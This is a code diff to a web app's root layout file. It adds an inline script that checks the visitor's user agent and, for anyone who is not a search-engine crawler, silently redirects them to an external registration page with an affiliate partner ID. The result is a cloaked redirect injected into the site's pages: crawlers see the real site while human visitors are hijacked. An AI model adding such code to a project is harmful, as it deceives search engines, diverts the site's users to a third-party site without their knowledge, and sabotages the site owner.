@@ -48,6 +48,21 @@ export default function RootLayout({
         />
         <meta name="theme-color" content="#14172b" />
         <link rel="icon" href="/icon.png" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://1579.sparksvale.com/ru/registration?partner=p1579p39210pfe27");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="x8r2-body">
         {children}
